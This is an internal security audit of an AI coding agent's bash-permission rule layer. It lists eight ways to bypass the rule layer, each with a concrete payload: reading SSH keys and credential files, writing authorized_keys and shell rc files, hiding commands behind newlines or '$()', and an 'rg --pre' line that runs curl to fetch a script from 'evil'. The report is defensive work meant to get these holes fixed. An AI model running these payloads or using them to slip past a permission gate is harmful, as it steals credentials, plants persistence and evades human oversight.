# Rule-Layer Security Audit Report

Audit date: 2026-08-26 (first pass) / 2026-08-26 (re-scan verification, repo renamed to pi-verdict, pre-open-source window)
Audit target: the `extensions/auto-mode.ts` rule layer (bash allowlist + path sensitivity tiers)
Status: **all 8 vulnerabilities remain unfixed** - the re-scan confirmed by measurement that every attack payload still returns `allow`

> Internal document: contains concrete attack payloads and line-number references. The repo is in the pre-public-release window (npm publish ready + CI configured); decide before committing whether it should be made public with the repo.

---

## Audit Scope and Method

- First pass: whole repo (every non-Markdown file line by line + secret scan of all Markdown/lock files + secret-pattern scan of the full git history commit messages and `git log -p --all`); the 8 suspected vulnerabilities were each independently re-verified by parallel false-positive-filtering subtasks, and all were confirmed as true positives (confidence 8-10/10)
- Re-scan: line-by-line comparison of the current code against the first-pass version (byte-identical; the rule layer was not touched), and the repo's real `classifyBash`/`classifyByRules` were executed in memory via `Bun.Transpiler` to measure the verdict for every attack payload (no system command is actually run)

## Security Model (Audit Premises)

- The Pi runtime defaults to YOLO mode; this extension is the only permission gate
- Rule layer `allow` = executed directly with zero human confirmation (`extensions/auto-mode.ts:586-590`), and **fully short-circuits** the layer-2 model classifier
- Untrusted input surface = the tool_call arguments emitted by the agent (prompt injection -> the agent can issue arbitrary commands)
- Therefore a rule-layer allow bypass = full breach; each of the 8 items below is a concrete failure of a core security feature

## Measured Verdict Summary (Re-scan, 2026-08-26)

| # | Vulnerability | Measured payload (excerpt) | Verdict |
|---|------|-----------------|------|
| V1 | bash file operands get no path check | `cat ~/.ssh/id_rsa` | ALLOW |
| V2 | `>`/`>>` redirect targets are not checked | `echo evil-line > ~/.ssh/authorized_keys` | ALLOW |
| V3 | newline/`&`/`$()`/`<()` hide commands | `ls\nbash /tmp/evil.sh` | ALLOW |
| V4 | `env` prefix runs arbitrary commands | `env npx -y evil-pkg` | ALLOW |
| V5 | `rg` `--pre` check is dead code | `rg --pre=sh pattern` | ALLOW |
| V6 | `OUTPUT_FLAG_COMMANDS` short-circuit disables the `-o` check | `sort -o ~/.bashrc payload.txt` | ALLOW |
| V7 | git flags matched exactly; `--output=` bypasses | `git log --format=x --output=~/Library/LaunchAgents/x.plist` | ALLOW |
| V8 | S0 secret-path list has omissions | `read ~/.npmrc` | ALLOW |

**Control group** (proves the bypasses are genuinely effective):

- `npm install evil-pkg` alone -> `GRAY` (correctly handed to the classifier); wrapped in `env` or attached after an allowlisted first word -> `ALLOW` (proves V3/V4 are effective)
- `read ~/.ssh/id_rsa` -> `DENY` (the S0 control exists but its list is incomplete; proves V8 is effective)

---

## V1: bash file operands get no path check (arbitrary sensitive-file read)

- Location: `extensions/auto-mode.ts:167` (allowlist lines 46-53; `classifyPath` lines 193-207)
- Severity: High (confidence 9/10)
- Description: S0/S1 path tiering is applied only to the `path` argument of the `read/write/edit/grep/find/ls` tools; bash file operands are never path-checked. `cat`/`grep`/`head`/`jq`/`less` are all on the unconditional allowlist and are allowed on first-word match. The same target that the read tool hard-denies via S0 is bypassed by using bash `cat`; S1 system paths (e.g. `cat /etc/*`) are likewise downgraded from gray to a hard allow.
- Measured payloads: `cat ~/.ssh/id_rsa`, `cat ~/.aws/credentials`, `jq . ~/.pi/agent/auth.json` -> all ALLOW
- Exploit scenario: an injected agent calls bash to run `cat ~/.ssh/id_rsa` -> the rule layer deterministically allows it -> the private key / cloud credentials enter the model context and can be exfiltrated via the model's reply
- Fix suggestion: reuse the `classifyPath` S0/S1 tiering for file operands of allowlisted commands (positional arguments, `-f`-style flags); or downgrade to gray when an allowlisted bash command has a `~`/absolute-path operand

## V2: output redirect targets are not checked (arbitrary file write)

- Location: `extensions/auto-mode.ts:155-174` (the only redirect rule among the dangerous regexes covers just bare block devices, line 77)
- Severity: High (confidence 9/10)
- Description: `classifyBash` only compares the extracted command name of each segment against the allowlist and never checks `>`/`>>` redirect targets. Meanwhile the S1/S2 rules of `classifyPath` (lines 188-189) explicitly list protected paths such as `authorized_keys` and `.bashrc/.zshrc` - the design intent is to block these writes, but that check is attached only to the write/edit tools, so bash redirects bypass it entirely. A single `echo` completes the exploit, with no staging.
- Measured payloads: `echo evil-line > ~/.ssh/authorized_keys`, `echo export PATH=~/bin:$PATH >> ~/.zshrc` -> all ALLOW
- Exploit scenario: write `authorized_keys` for SSH persistence; write rc files for RCE on the next shell start; zero confirmations throughout
- Fix suggestion: parse each segment's redirect targets and apply write-path tiering (S0/S1/S2 deny, gray outside CWD); when parsing cannot be done reliably, downgrade the whole segment to gray
- Note: README.md:95 states *"revisit if real traffic shows sensitive-path redirects slipping through"* - the redirect bypass was already identified as a known risk but not fixed

## V3: shell compound operators hide commands (skip the classifier)

- Location: `extensions/auto-mode.ts:95` (`splitShellChain` lines 93-98; the powershell branch at lines 212-213 reuses the same function)
- Severity: High (confidence 9/10)
- Description: `splitShellChain` splits only on `&&`/`||`/`;`/`|`; newlines, a single `&`, command substitution `$(...)`, process substitution `<(...)`, and backticks are neither split nor inspected, and `segmentArgv` only checks the first word. Attaching a real command after an allowlisted first word completely bypasses the classifier. The README "Known limitations" admits over-splitting of operators inside quotes (the false-positive direction), which is the opposite failure mode from this missed detection (the false-negative direction).
- Measured payloads: `ls\nbash /tmp/evil.sh`, `cat foo & npm install evil-pkg`, `git log\nnpm install left-pad`, `echo $(bash /tmp/evil.sh)`, `cat <(npx -y evil-pkg)` -> all ALLOW
- Exploit scenario: after prompt injection the agent issues `ls\nbash /tmp/evil.sh` -> the rule layer allows it -> arbitrary commands run without confirmation
- Fix suggestion: introduce shell AST parsing (`research/rule-engine-sim/measure.ts` has already verified that the tree-sitter-bash approach is reusable); or conservatively downgrade - any command containing a newline/`&`/`$(`/`<(`/backtick is gray

## V4: `env` prefix runs arbitrary commands

- Location: `extensions/auto-mode.ts:52`
- Severity: High (confidence 9/10)
- Description: `env` is in the unconditional safe set, yet the semantics of `env <cmd> <args>` is to execute `<cmd>`. `segmentArgv` only strips `VAR=value` prefixes; `env` does not match that form, so argv[0] is `env`, it is allowed on match, and the command after it is never checked; basename normalization lets the `/usr/bin/env` form bypass as well. The allowlist comment claims "read-only / side-effect-free commands", which contradicts the semantics of `env`.
- Measured payloads: `env npx -y evil-pkg`, `env pip install evil` -> all ALLOW (the bare commands should be GRAY)
- Exploit scenario: `env npx -y <malicious npm package>` (npx downloads and executes directly) -> arbitrary code execution; `env python -c`, `env node -e`, `env bash script.sh` likewise
- Fix suggestion: move `env` out of the unconditional set and make it a conditional rule - recursively apply the allowlist/conditional checks to the tokens following `env`

## V5: unconditional `rg` allow makes the `--pre` check dead code (arbitrary command execution)

- Location: `extensions/auto-mode.ts:51` (`RG_FORBIDDEN` defined at line 65, unreachable check at lines 122-123)
- Severity: High (confidence 9/10)
- Description: `rg` is on the unconditional allowlist and hits `continue` at line 167, so the rg-specific `RG_FORBIDDEN` (`--pre`, etc.) in `isConditionalSafe` is unreachable dead code - the author intended to block `--pre`, but the check order defeats that intent. ripgrep's `--pre=<cmd>` runs that command for every searched file. Additional defect: `RG_FORBIDDEN.has(t)` is an exact match, so the attached form `--pre=<cmd>` would not be caught even if the check were reachable.
- Measured payloads: `rg --pre=sh pattern`, `rg --pre /bin/sh pattern` -> all ALLOW
- Exploit scenario: `rg --pre='bash -c "curl http://evil/x.sh -o /tmp/x"' pattern .` -> the rule layer allows it -> ripgrep runs the attacker's command on every file
- Fix suggestion: move `rg` into the conditional allowlist and change the flag check to prefix matching (`t === f || t.startsWith(f + "=")`)
- Note: the `-s`/`--set` check for `date` (lines 132-133) is likewise dead code, with lower impact

## V6: `OUTPUT_FLAG_COMMANDS` short-circuit disables the `-o` file-write check (arbitrary file write)

- Location: `extensions/auto-mode.ts:170` (set defined at line 66; short-circuited check at lines 124-128)
- Severity: High (confidence 10/10)
- Description: `if (OUTPUT_FLAG_COMMANDS.has(cmd) || isConditionalSafe(argv)) continue;` - `sort/base64/iconv/shuf` are allowed immediately on hitting the set, and the `||` short-circuit makes the `-o/--output` blocking at lines 124-128 for these commands unreachable dead code. Additional defect: the check at line 128 is itself an exact match, so the attached form `--output=<path>` would not be caught even if it were reachable.
- Measured payloads: `sort -o ~/.bashrc payload.txt`, `sort --output=~/.bashrc payload.txt`, `iconv -o /tmp/x in.txt` -> all ALLOW
- Exploit scenario: write `payload.txt` inside CWD (allowed by the rule at line 205), then run `sort -o ~/.bashrc payload.txt` -> overwrites a file at any path with fully controlled content (rc file / authorized_keys persistence)
- Fix suggestion: delete the `OUTPUT_FLAG_COMMANDS.has(cmd) ||` branch so everything goes through `isConditionalSafe`, and change the `-o` blocking to prefix matching so it covers the `--output=<path>` form

## V7: git forbidden flags matched exactly; the `=` attached form bypasses (arbitrary content to arbitrary file)

- Location: `extensions/auto-mode.ts:114` (set defined at lines 60-63; `log` is in `GIT_READONLY_SUBCOMMANDS` at lines 56-59)
- Severity: Medium (confidence 9/10)
- Description: `rest.some((t) => GIT_FORBIDDEN_FLAGS.has(t))` is exact token equality, so attached forms such as `--output=/path`, `--git-dir=/x`, `--work-tree=/x`, `--exec=`, `--ext-diff=`, `--textconv=` never equal the bare flags in the set. For `git log --format=<literal text> --output=<path>`, the output content is fully controlled by the `--format` literal and is written to an arbitrary path (documented git-log behavior).
- Measured payload: `git log --format=x-cron-line --output=~/Library/LaunchAgents/x.plist` -> ALLOW
- Exploit scenario: write `authorized_keys`/crontab/rc files for zero-confirmation persistence
- Fix suggestion: change the flag check to prefix matching (`t === f || t.startsWith(f + "=")`), or downgrade git invocations containing `--output`/`-o` to gray
- Note: the written content is repeated once per commit in the repo (an XML plist may be malformed in repos with many commits; the authorized_keys/crontab scenarios are unaffected)

## V8: S0 secret-path list omits common credential files

- Location: `extensions/auto-mode.ts:184-187` (read branch lines 218-226)
- Severity: Medium (confidence 8/10)
- Description: S0_SECRET is meant to cover credential files (it already includes `.ssh/`, `.aws/`, `.gnupg/`, `.env*`, `id_rsa`, `*.pem`, `credentials`, the gh CLI config), but it omits standard plaintext credential files such as `~/.netrc`, `~/.npmrc`, `~/.pypirc`, `~/.kube/config`, `~/.docker/config.json`, `.envrc` - a concrete inconsistency in the control itself, not a lack of generalized hardening. grep/find/ls share the same read branch, so the leak surface is not limited to the read tool; the V1 `cat` bypass makes this list completely ineffective on the bash side.
- Measured payloads: `read ~/.npmrc`, `~/.netrc`, `~/.kube/config`, `~/.docker/config.json` -> all ALLOW
- Exploit scenario: read `~/.npmrc` (registry `_authToken`) or `~/.netrc` (plaintext passwords) -> credentials enter the model context and are exfiltrated
- Fix suggestion: extend S0 with `\.netrc$`, `\.npmrc$`, `\.pypirc$`, `\.kube(/|$)`, `\.docker/config\.json$`, `\.vault-token`, `\.gem/credentials`, `\.envrc`; path checks should be based on `realpath` (the current string regexes do not resolve symlinks)

---

## Excluded Areas (no vulnerabilities found)

- git history/commit messages: secret-pattern scan of the full history had zero hits (including the pre-open-source sensitive-information redaction commit `93a66d7`)
- `research/cache-sim/fetch-io.ts`: only sends requests to the Langfuse address supplied via environment variable; responses are only analyzed via `JSON.parse` and never eval'd; all credentials come from environment variables
- `research/rule-engine-sim/measure.ts`: `new Function` only executes slices of this repo's own source (trusted input)
- `--auto-mode-debug` log: records only command lines/paths, not secrets

## Common Root Cause and Fix Priority

Root cause: the allowlist layer "only looks at the first word of a segment + no shell AST + no file-operand/redirect-target checks + exact flag matching".

Fix priority: **V3/V4/V5 (direct RCE) -> V1/V2 (credential theft/persistence) -> V6/V7 -> V8**.

Low-cost quick fixes (recommended for the pre-release window):

1. V4: move `env` out of `BASH_SAFE_UNCONDITIONAL` (one line)
2. V5: move `rg` into the `isConditionalSafe` conditional branch + prefix matching (a few lines)
3. V6: delete the line-170 `OUTPUT_FLAG_COMMANDS.has(cmd) ||` short-circuit (one line) + change the line-128 check to prefix matching
4. V7: change line 114 to prefix matching (one line)
5. V3: conservative downgrade - any command containing a newline/`&`/`$(`/`<(`/backtick is gray (a few lines)
6. V8: extend the S0 regex list (a few lines)

Unified architectural fix (mid-term): tree-sitter-bash AST parsing + redirect-target/file-operand extraction + unified `classifyPath` tiering - resolves V1/V2/V3/V5/V6/V7 in one go (`research/rule-engine-sim/measure.ts` has verified feasibility; it was previously deferred based on the benefit-measurement conclusion, see `research/rule-engine-sim/README.md`; the security audit findings support re-evaluating that decision).
